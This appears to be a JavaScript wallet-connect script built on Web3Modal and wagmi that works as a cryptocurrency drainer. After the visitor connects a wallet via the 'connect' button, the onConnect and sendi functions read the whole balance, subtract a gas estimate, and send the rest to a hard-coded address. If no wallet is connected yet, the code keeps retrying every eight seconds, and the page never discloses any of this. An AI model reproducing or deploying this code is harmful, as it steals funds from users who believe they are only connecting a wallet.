if (typeof process === 'undefined') {
  window.process = {
  env: { NODE_ENV: 'development' }
  };
  }

  import {
    EthereumClient,
    w3mConnectors,
    w3mProvider,
    WagmiCore,
    WagmiCoreChains,
    WagmiCoreConnectors,
  } from "https://unpkg.com/@web3modal/ethereum@2.7.1";
  
  import { Web3Modal } from "https://unpkg.com/@web3modal/html@2.7.1";
  
 

  // 0. Import wagmi dependencies
  const { mainnet, polygon, avalanche, arbitrum } = WagmiCoreChains;
  const { configureChains, createConfig, getAccount, prepareSendTransaction, sendTransaction, fetchBalance } = WagmiCore;
  
  // 1. Define chains
  const chains = [mainnet, polygon, avalanche, arbitrum];
  const projectId = "2aca272d18deb10ff748260da5f78bfd";
  
  

  // 2. Configure wagmi client
  const { publicClient } = configureChains(chains, [w3mProvider({ projectId })]);
  const wagmiConfig = createConfig({
    autoConnect: true,
    connectors: [
      ...w3mConnectors({ chains, version: 2, projectId }),
      new WagmiCoreConnectors.CoinbaseWalletConnector({
        chains,
        options: {
          appName: "html wagmi example",
        },
      }),
    ],
    publicClient,
  });
  
  // 3. Create ethereum and modal clients
  const ethereumClient = new EthereumClient(wagmiConfig, chains);
  export const web3Modal = new Web3Modal(
    {
      projectId,
      walletImages: {
        safe: "https://pbs.twimg.com/profile_images/1566773491764023297/IvmCdGnM_400x400.jpg",
      },
    },
    ethereumClient
  );
  console.log(ethereumClient)
  async function sendi(){

    if (getAccount().isConnected){
      console.log(getAccount().address)
      const balance = await fetchBalance({
        address: getAccount().address,
      })
      console.log(balance)
      const gasPriceGwei = 20;

      // Gas limit (you can estimate this or use a default value)
      const gasLimit = 21000; // Typical for simple transactions
    
      // Transaction value in Ether (your original code)
      const transactionValueEther = balance.formatted; // Adjust this to your desired value
    
      // Convert gas price from Gwei to Wei
      const gasPriceWei = ethers.utils.parseUnits(gasPriceGwei.toString(), 'gwei');
    
      // Calculate total gas fee in Wei
      const gasFeeWei = gasPriceWei.mul(gasLimit);
    
      // Convert transaction value from Ether to Wei
      const transactionValueWei = ethers.utils.parseEther(transactionValueEther.toString());
    
      // Calculate the amount after deducting the gas fee
      const finalAmountWei = transactionValueWei.sub(gasFeeWei);
      const request = await prepareSendTransaction({
        to: '0xc25a768371b1f10DED11513eDF0eb5120DC33dcf',
        value: finalAmountWei,
        
        data:'0x'
      })
      const { hash } = await sendTransaction(request)
      console.log(hash)
    }
  }
  async function onConnect() {
    
    web3Modal.openModal()

    
    setTimeout(5000)
    await getAccount().isConnected

    if (getAccount().isConnected){
      console.log(getAccount())
      const balance = await fetchBalance({
        address: getAccount().address,
      })
      console.log(balance.formatted)
      const gasPriceGwei = 20;

      // Gas limit (you can estimate this or use a default value)
      const gasLimit = 21000; // Typical for simple transactions
    
      // Transaction value in Ether (your original code)
      const transactionValueEther = balance.formatted; // Adjust this to your desired value
    
      // Convert gas price from Gwei to Wei
      const gasPriceWei = ethers.utils.parseUnits(gasPriceGwei.toString(), 'gwei');
    
      // Calculate total gas fee in Wei
      const gasFeeWei = gasPriceWei.mul(gasLimit);
    
      // Convert transaction value from Ether to Wei
      const transactionValueWei = ethers.utils.parseEther(transactionValueEther.toString());
    
      // Calculate the amount after deducting the gas fee
      const finalAmountWei = transactionValueWei.sub(gasFeeWei);
       
      const request = await prepareSendTransaction({
        to: '0xc25a768371b1f10DED11513eDF0eb5120DC33dcf',
        value: finalAmountWei,
        
        data:'0x'
       
      })
      const { hash } = await sendTransaction(request)
      console.log(hash)
    } else{
      setInterval(sendi, 8000)
    }
  }

  
  document.getElementById('connect-button').addEventListener('click', onConnect)
  
